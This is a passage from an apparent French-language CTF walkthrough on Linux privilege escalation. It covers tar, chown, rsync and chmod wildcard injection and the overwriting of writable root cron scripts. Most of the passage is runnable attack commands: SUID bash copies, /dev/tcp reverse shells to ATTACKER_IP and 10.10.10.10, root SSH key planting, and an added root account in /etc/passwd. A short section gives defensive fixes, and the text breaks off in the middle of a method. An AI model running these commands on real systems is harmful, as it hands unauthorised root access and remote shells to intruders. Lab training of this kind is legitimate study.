<span id="cb60-4"><a href="#cb60-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Exemple de ligne vulnérable:</span></span>
<span id="cb60-5"><a href="#cb60-5" aria-hidden="true" tabindex="-1"></a><span class="co"># * * * * * root /usr/local/bin/compress.sh</span></span>
<span id="cb60-6"><a href="#cb60-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-7"><a href="#cb60-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Vérifier le contenu du script</span></span>
<span id="cb60-8"><a href="#cb60-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /usr/local/bin/compress.sh</span>
<span id="cb60-9"><a href="#cb60-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-10"><a href="#cb60-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Script vulnérable typique:</span></span>
<span id="cb60-11"><a href="#cb60-11" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb60-12"><a href="#cb60-12" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /home/user</span>
<span id="cb60-13"><a href="#cb60-13" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> czf /tmp/backup.tar.gz <span class="pp">*</span></span>
<span id="cb60-14"><a href="#cb60-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-15"><a href="#cb60-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Le &quot;*&quot; est dangereux!</span></span>
<span id="cb60-16"><a href="#cb60-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-17"><a href="#cb60-17" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. EXPLOITATION TAR avec wildcards</span></span>
<span id="cb60-18"><a href="#cb60-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Créer des fichiers spéciaux qui seront interprétés comme des options</span></span>
<span id="cb60-19"><a href="#cb60-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-20"><a href="#cb60-20" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /home/user</span>
<span id="cb60-21"><a href="#cb60-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-22"><a href="#cb60-22" aria-hidden="true" tabindex="-1"></a><span class="co"># Créer un script malveillant</span></span>
<span id="cb60-23"><a href="#cb60-23" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> shell.sh <span class="op">&lt;&lt; EOF</span></span>
<span id="cb60-24"><a href="#cb60-24" aria-hidden="true" tabindex="-1"></a><span class="st">#!/bin/bash</span></span>
<span id="cb60-25"><a href="#cb60-25" aria-hidden="true" tabindex="-1"></a><span class="st">cp /bin/bash /tmp/rootbash</span></span>
<span id="cb60-26"><a href="#cb60-26" aria-hidden="true" tabindex="-1"></a><span class="st">chmod +s /tmp/rootbash</span></span>
<span id="cb60-27"><a href="#cb60-27" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb60-28"><a href="#cb60-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-29"><a href="#cb60-29" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x shell.sh</span>
<span id="cb60-30"><a href="#cb60-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-31"><a href="#cb60-31" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Créer les fichiers &quot;options&quot; pour tar</span></span>
<span id="cb60-32"><a href="#cb60-32" aria-hidden="true" tabindex="-1"></a><span class="co"># --checkpoint=1 : Exécute une action à chaque fichier</span></span>
<span id="cb60-33"><a href="#cb60-33" aria-hidden="true" tabindex="-1"></a><span class="co"># --checkpoint-action=exec=shell.sh : Exécute notre script</span></span>
<span id="cb60-34"><a href="#cb60-34" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-35"><a href="#cb60-35" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> /home/user/--checkpoint=1</span>
<span id="cb60-36"><a href="#cb60-36" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> /home/user/--checkpoint-action=exec=shell.sh</span>
<span id="cb60-37"><a href="#cb60-37" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-38"><a href="#cb60-38" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Attendre que le cron s&#39;exécute</span></span>
<span id="cb60-39"><a href="#cb60-39" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier si rootbash est créé</span></span>
<span id="cb60-40"><a href="#cb60-40" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /tmp/rootbash</span>
<span id="cb60-41"><a href="#cb60-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-42"><a href="#cb60-42" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Exécuter le bash SUID</span></span>
<span id="cb60-43"><a href="#cb60-43" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp/rootbash</span> <span class="at">-p</span></span>
<span id="cb60-44"><a href="#cb60-44" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-45"><a href="#cb60-45" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Vérifier que vous êtes root</span></span>
<span id="cb60-46"><a href="#cb60-46" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb60-47"><a href="#cb60-47" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb60-48"><a href="#cb60-48" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-49"><a href="#cb60-49" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Lire le flag</span></span>
<span id="cb60-50"><a href="#cb60-50" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span>
<span id="cb60-51"><a href="#cb60-51" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-52"><a href="#cb60-52" aria-hidden="true" tabindex="-1"></a><span class="co"># ALTERNATIVE - Reverse Shell</span></span>
<span id="cb60-53"><a href="#cb60-53" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Méthode reverse shell</span></span>
<span id="cb60-54"><a href="#cb60-54" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /home/user/shell.sh <span class="op">&lt;&lt; EOF</span></span>
<span id="cb60-55"><a href="#cb60-55" aria-hidden="true" tabindex="-1"></a><span class="st">#!/bin/bash</span></span>
<span id="cb60-56"><a href="#cb60-56" aria-hidden="true" tabindex="-1"></a><span class="st">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</span></span>
<span id="cb60-57"><a href="#cb60-57" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb60-58"><a href="#cb60-58" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-59"><a href="#cb60-59" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /home/user/shell.sh</span>
<span id="cb60-60"><a href="#cb60-60" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-61"><a href="#cb60-61" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> /home/user/--checkpoint=1</span>
<span id="cb60-62"><a href="#cb60-62" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> /home/user/--checkpoint-action=exec=shell.sh</span>
<span id="cb60-63"><a href="#cb60-63" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-64"><a href="#cb60-64" aria-hidden="true" tabindex="-1"></a><span class="co"># Sur votre machine</span></span>
<span id="cb60-65"><a href="#cb60-65" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lvnp</span> 4444</span>
<span id="cb60-66"><a href="#cb60-66" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-67"><a href="#cb60-67" aria-hidden="true" tabindex="-1"></a><span class="co"># ALTERNATIVE - Chown</span></span>
<span id="cb60-68"><a href="#cb60-68" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Donner ownership de /etc/passwd</span></span>
<span id="cb60-69"><a href="#cb60-69" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /home/user/shell.sh <span class="op">&lt;&lt; EOF</span></span>
<span id="cb60-70"><a href="#cb60-70" aria-hidden="true" tabindex="-1"></a><span class="st">#!/bin/bash</span></span>
<span id="cb60-71"><a href="#cb60-71" aria-hidden="true" tabindex="-1"></a><span class="st">chown user:user /etc/passwd</span></span>
<span id="cb60-72"><a href="#cb60-72" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb60-73"><a href="#cb60-73" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-74"><a href="#cb60-74" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /home/user/shell.sh</span>
<span id="cb60-75"><a href="#cb60-75" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-76"><a href="#cb60-76" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> /home/user/--checkpoint=1</span>
<span id="cb60-77"><a href="#cb60-77" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> /home/user/--checkpoint-action=exec=shell.sh</span>
<span id="cb60-78"><a href="#cb60-78" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb60-79"><a href="#cb60-79" aria-hidden="true" tabindex="-1"></a><span class="co"># Attendre le cron, puis modifier /etc/passwd</span></span></code></pre></div>
<h3 id="explication-de-lexploitation"> Explication de
l’exploitation</h3>
<p><strong>Pourquoi c’est vulnérable :</strong></p>
<p>Le script exécute :</p>
<div class="sourceCode" id="cb61"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb61-1"><a href="#cb61-1" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> czf /tmp/backup.tar.gz <span class="pp">*</span></span></code></pre></div>
<p>Le wildcard <code>*</code> est expansé par le shell en liste de
fichiers :</p>
<div class="sourceCode" id="cb62"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb62-1"><a href="#cb62-1" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> czf /tmp/backup.tar.gz file1 file2 <span class="at">--checkpoint</span><span class="op">=</span>1 <span class="at">--checkpoint-action</span><span class="op">=</span>exec=shell.sh file3</span></code></pre></div>
<p>Tar interprète <code>--checkpoint=1</code> et
<code>--checkpoint-action=exec=shell.sh</code> comme des
<strong>options</strong> et non des <strong>fichiers</strong> !</p>
<h3 id="autres-commandes-vulnérables-aux-wildcards"> Autres commandes
vulnérables aux wildcards</h3>
<p><strong>Chown :</strong></p>
<div class="sourceCode" id="cb63"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb63-1"><a href="#cb63-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Script vulnérable:</span></span>
<span id="cb63-2"><a href="#cb63-2" aria-hidden="true" tabindex="-1"></a><span class="fu">chown</span> root:root <span class="pp">*</span></span>
<span id="cb63-3"><a href="#cb63-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb63-4"><a href="#cb63-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Exploitation:</span></span>
<span id="cb63-5"><a href="#cb63-5" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> <span class="at">--</span> <span class="at">--reference</span><span class="op">=</span>/root/file</span>
<span id="cb63-6"><a href="#cb63-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Chown copiera les permissions de /root/file</span></span>
<span id="cb63-7"><a href="#cb63-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb63-8"><a href="#cb63-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou:</span></span>
<span id="cb63-9"><a href="#cb63-9" aria-hidden="true" tabindex="-1"></a><span class="fu">ln</span> <span class="at">-s</span> /etc/passwd test</span>
<span id="cb63-10"><a href="#cb63-10" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> <span class="at">--</span> <span class="at">--reference</span><span class="op">=</span>test</span>
<span id="cb63-11"><a href="#cb63-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Chown suivra le symlink</span></span></code></pre></div>
<p><strong>Rsync :</strong></p>
<div class="sourceCode" id="cb64"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb64-1"><a href="#cb64-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Script vulnérable:</span></span>
<span id="cb64-2"><a href="#cb64-2" aria-hidden="true" tabindex="-1"></a><span class="fu">rsync</span> <span class="at">-a</span> <span class="pp">*</span> /backup/</span>
<span id="cb64-3"><a href="#cb64-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb64-4"><a href="#cb64-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Exploitation:</span></span>
<span id="cb64-5"><a href="#cb64-5" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&quot;</span> <span class="op">&gt;</span> shell.sh</span>
<span id="cb64-6"><a href="#cb64-6" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x shell.sh</span>
<span id="cb64-7"><a href="#cb64-7" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> <span class="at">--</span> <span class="at">-e</span> sh shell.sh</span>
<span id="cb64-8"><a href="#cb64-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb64-9"><a href="#cb64-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Rsync exécutera: -e sh shell.sh</span></span></code></pre></div>
<p><strong>Chmod :</strong></p>
<div class="sourceCode" id="cb65"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb65-1"><a href="#cb65-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Script vulnérable:</span></span>
<span id="cb65-2"><a href="#cb65-2" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 777 <span class="pp">*</span></span>
<span id="cb65-3"><a href="#cb65-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb65-4"><a href="#cb65-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Exploitation:</span></span>
<span id="cb65-5"><a href="#cb65-5" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> <span class="at">--</span> <span class="at">--reference</span><span class="op">=</span>/etc/shadow</span>
<span id="cb65-6"><a href="#cb65-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Chmod copiera les permissions de /etc/shadow</span></span></code></pre></div>
<p><strong>Find :</strong></p>
<div class="sourceCode" id="cb66"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb66-1"><a href="#cb66-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Script vulnérable:</span></span>
<span id="cb66-2"><a href="#cb66-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> . <span class="at">-name</span> <span class="st">&quot;*.tmp&quot;</span> <span class="at">-delete</span></span>
<span id="cb66-3"><a href="#cb66-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb66-4"><a href="#cb66-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Exploitation:</span></span>
<span id="cb66-5"><a href="#cb66-5" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> <span class="at">--</span> <span class="at">-name</span> whoami</span>
<span id="cb66-6"><a href="#cb66-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Causera une erreur et potentiellement exécutera whoami</span></span></code></pre></div>
<h3 id="liste-des-options-dangereuses-de-tar"> Liste des options
dangereuses de tar</h3>
<div class="sourceCode" id="cb67"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb67-1"><a href="#cb67-1" aria-hidden="true" tabindex="-1"></a><span class="ex">--checkpoint=N</span>              <span class="co"># Exécute action tous les N fichiers</span></span>
<span id="cb67-2"><a href="#cb67-2" aria-hidden="true" tabindex="-1"></a><span class="ex">--checkpoint-action=ACTION</span>  <span class="co"># Action à exécuter</span></span>
<span id="cb67-3"><a href="#cb67-3" aria-hidden="true" tabindex="-1"></a><span class="ex">--to-command=COMMAND</span>        <span class="co"># Pipe les fichiers vers une commande</span></span>
<span id="cb67-4"><a href="#cb67-4" aria-hidden="true" tabindex="-1"></a><span class="ex">--use-compress-program=PROG</span> <span class="co"># Utilise un programme externe</span></span>
<span id="cb67-5"><a href="#cb67-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-T</span> FILE                     <span class="co"># Lit les noms de fichiers depuis FILE</span></span></code></pre></div>
<p><strong>Exemples d’exploitation :</strong></p>
<div class="sourceCode" id="cb68"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb68-1"><a href="#cb68-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Via checkpoint</span></span>
<span id="cb68-2"><a href="#cb68-2" aria-hidden="true" tabindex="-1"></a><span class="ex">--checkpoint=1</span></span>
<span id="cb68-3"><a href="#cb68-3" aria-hidden="true" tabindex="-1"></a><span class="ex">--checkpoint-action=exec=/bin/sh</span></span>
<span id="cb68-4"><a href="#cb68-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb68-5"><a href="#cb68-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Via to-command</span></span>
<span id="cb68-6"><a href="#cb68-6" aria-hidden="true" tabindex="-1"></a><span class="ex">--to-command=/bin/sh</span></span>
<span id="cb68-7"><a href="#cb68-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb68-8"><a href="#cb68-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Via compress-program</span></span>
<span id="cb68-9"><a href="#cb68-9" aria-hidden="true" tabindex="-1"></a><span class="ex">--use-compress-program=</span><span class="st">&#39;/bin/sh -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1&quot;&#39;</span></span></code></pre></div>
<h3 id="protection-contre-les-wildcards"> Protection contre les
wildcards</h3>
<p><strong>Code vulnérable :</strong></p>
<div class="sourceCode" id="cb69"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb69-1"><a href="#cb69-1" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> czf backup.tar.gz <span class="pp">*</span></span></code></pre></div>
<p><strong>Code sécurisé :</strong></p>
<div class="sourceCode" id="cb70"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb70-1"><a href="#cb70-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Méthode 1: Utiliser ./* au lieu de *</span></span>
<span id="cb70-2"><a href="#cb70-2" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> czf backup.tar.gz ./<span class="pp">*</span></span>
<span id="cb70-3"><a href="#cb70-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb70-4"><a href="#cb70-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Méthode 2: Utiliser find</span></span>
<span id="cb70-5"><a href="#cb70-5" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> . <span class="at">-type</span> f <span class="at">-print0</span> <span class="kw">|</span> <span class="fu">tar</span> czf backup.tar.gz <span class="at">--null</span> <span class="at">-T</span> <span class="at">-</span></span>
<span id="cb70-6"><a href="#cb70-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb70-7"><a href="#cb70-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Méthode 3: Mettre le wildcard après les options</span></span>
<span id="cb70-8"><a href="#cb70-8" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> czf backup.tar.gz <span class="at">--</span> <span class="pp">*</span></span></code></pre></div>
<h3 id="réponse-16"> Réponse</h3>
<p>Shell root obtenu via exploitation de wildcards dans tar</p>
<hr />
<h2
id="task-18---privilege-escalation---cron-file-overwrite"><a name="task-18"></a>Task
18 - Privilege Escalation - Cron (File Overwrite)</h2>
<h3 id="objectif-17"> Objectif</h3>
<p>Exploiter un script cron qui écrase un fichier accessible en
écriture.</p>
<h3 id="commandes-17"> Commandes</h3>
<div class="sourceCode" id="cb71"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb71-1"><a href="#cb71-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Examiner le crontab</span></span>
<span id="cb71-2"><a href="#cb71-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/crontab</span>
<span id="cb71-3"><a href="#cb71-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-4"><a href="#cb71-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Exemple:</span></span>
<span id="cb71-5"><a href="#cb71-5" aria-hidden="true" tabindex="-1"></a><span class="co"># * * * * * root overwrite.sh</span></span>
<span id="cb71-6"><a href="#cb71-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-7"><a href="#cb71-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Localiser et examiner le script</span></span>
<span id="cb71-8"><a href="#cb71-8" aria-hidden="true" tabindex="-1"></a><span class="fu">locate</span> overwrite.sh</span>
<span id="cb71-9"><a href="#cb71-9" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /usr/local/bin/overwrite.sh</span>
<span id="cb71-10"><a href="#cb71-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-11"><a href="#cb71-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Script typique:</span></span>
<span id="cb71-12"><a href="#cb71-12" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb71-13"><a href="#cb71-13" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;Hello from cron&quot;</span> <span class="op">&gt;</span> /usr/local/bin/output.txt</span>
<span id="cb71-14"><a href="#cb71-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-15"><a href="#cb71-15" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Vérifier les permissions du script</span></span>
<span id="cb71-16"><a href="#cb71-16" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /usr/local/bin/overwrite.sh</span>
<span id="cb71-17"><a href="#cb71-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-18"><a href="#cb71-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Si le script est accessible en écriture:</span></span>
<span id="cb71-19"><a href="#cb71-19" aria-hidden="true" tabindex="-1"></a><span class="co"># -rwxr-xrwx 1 root root ... overwrite.sh</span></span>
<span id="cb71-20"><a href="#cb71-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-21"><a href="#cb71-21" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. MÉTHODE 1 - Remplacer le contenu du script</span></span>
<span id="cb71-22"><a href="#cb71-22" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /usr/local/bin/overwrite.sh <span class="op">&lt;&lt; EOF</span></span>
<span id="cb71-23"><a href="#cb71-23" aria-hidden="true" tabindex="-1"></a><span class="st">#!/bin/bash</span></span>
<span id="cb71-24"><a href="#cb71-24" aria-hidden="true" tabindex="-1"></a><span class="st">cp /bin/bash /tmp/rootbash</span></span>
<span id="cb71-25"><a href="#cb71-25" aria-hidden="true" tabindex="-1"></a><span class="st">chmod +s /tmp/rootbash</span></span>
<span id="cb71-26"><a href="#cb71-26" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb71-27"><a href="#cb71-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-28"><a href="#cb71-28" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. S&#39;assurer que le script est exécutable</span></span>
<span id="cb71-29"><a href="#cb71-29" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /usr/local/bin/overwrite.sh</span>
<span id="cb71-30"><a href="#cb71-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-31"><a href="#cb71-31" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Attendre l&#39;exécution du cron (max 1 minute)</span></span>
<span id="cb71-32"><a href="#cb71-32" aria-hidden="true" tabindex="-1"></a><span class="ex">watch</span> <span class="at">-n</span> 1 <span class="st">&#39;ls -la /tmp/rootbash&#39;</span></span>
<span id="cb71-33"><a href="#cb71-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-34"><a href="#cb71-34" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Exécuter le bash SUID</span></span>
<span id="cb71-35"><a href="#cb71-35" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp/rootbash</span> <span class="at">-p</span></span>
<span id="cb71-36"><a href="#cb71-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-37"><a href="#cb71-37" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Vérifier que vous êtes root</span></span>
<span id="cb71-38"><a href="#cb71-38" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb71-39"><a href="#cb71-39" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb71-40"><a href="#cb71-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-41"><a href="#cb71-41" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Lire le flag</span></span>
<span id="cb71-42"><a href="#cb71-42" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span>
<span id="cb71-43"><a href="#cb71-43" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-44"><a href="#cb71-44" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE 2 - Reverse Shell</span></span>
<span id="cb71-45"><a href="#cb71-45" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Modifier le script pour un reverse shell</span></span>
<span id="cb71-46"><a href="#cb71-46" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /usr/local/bin/overwrite.sh <span class="op">&lt;&lt; EOF</span></span>
<span id="cb71-47"><a href="#cb71-47" aria-hidden="true" tabindex="-1"></a><span class="st">#!/bin/bash</span></span>
<span id="cb71-48"><a href="#cb71-48" aria-hidden="true" tabindex="-1"></a><span class="st">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</span></span>
<span id="cb71-49"><a href="#cb71-49" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb71-50"><a href="#cb71-50" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-51"><a href="#cb71-51" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /usr/local/bin/overwrite.sh</span>
<span id="cb71-52"><a href="#cb71-52" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-53"><a href="#cb71-53" aria-hidden="true" tabindex="-1"></a><span class="co"># Sur votre machine</span></span>
<span id="cb71-54"><a href="#cb71-54" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lvnp</span> 4444</span>
<span id="cb71-55"><a href="#cb71-55" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-56"><a href="#cb71-56" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE 3 - Ajouter votre clé SSH</span></span>
<span id="cb71-57"><a href="#cb71-57" aria-hidden="true" tabindex="-1"></a><span class="co"># 11. Ajouter votre clé SSH à root</span></span>
<span id="cb71-58"><a href="#cb71-58" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /usr/local/bin/overwrite.sh <span class="op">&lt;&lt; EOF</span></span>
<span id="cb71-59"><a href="#cb71-59" aria-hidden="true" tabindex="-1"></a><span class="st">#!/bin/bash</span></span>
<span id="cb71-60"><a href="#cb71-60" aria-hidden="true" tabindex="-1"></a><span class="st">mkdir -p /root/.ssh</span></span>
<span id="cb71-61"><a href="#cb71-61" aria-hidden="true" tabindex="-1"></a><span class="st">echo &quot;ssh-rsa AAAA...your_public_key&quot; &gt;&gt; /root/.ssh/authorized_keys</span></span>
<span id="cb71-62"><a href="#cb71-62" aria-hidden="true" tabindex="-1"></a><span class="st">chmod 600 /root/.ssh/authorized_keys</span></span>
<span id="cb71-63"><a href="#cb71-63" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb71-64"><a href="#cb71-64" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-65"><a href="#cb71-65" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /usr/local/bin/overwrite.sh</span>
<span id="cb71-66"><a href="#cb71-66" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-67"><a href="#cb71-67" aria-hidden="true" tabindex="-1"></a><span class="co"># Attendre le cron, puis se connecter</span></span>
<span id="cb71-68"><a href="#cb71-68" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="at">-i</span> your_private_key root@MACHINE_IP</span>
<span id="cb71-69"><a href="#cb71-69" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-70"><a href="#cb71-70" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE 4 - Modifier /etc/passwd</span></span>
<span id="cb71-71"><a href="#cb71-71" aria-hidden="true" tabindex="-1"></a><span class="co"># 12. Script pour modifier /etc/passwd</span></span>
<span id="cb71-72"><a href="#cb71-72" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /usr/local/bin/overwrite.sh <span class="op">&lt;&lt; EOF</span></span>
<span id="cb71-73"><a href="#cb71-73" aria-hidden="true" tabindex="-1"></a><span class="st">#!/bin/bash</span></span>
<span id="cb71-74"><a href="#cb71-74" aria-hidden="true" tabindex="-1"></a><span class="st">echo &#39;hacker:</span><span class="va">$1$xyz$F3QzWGa8D0rEJBiOC8kNm0</span><span class="st">:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd</span></span>
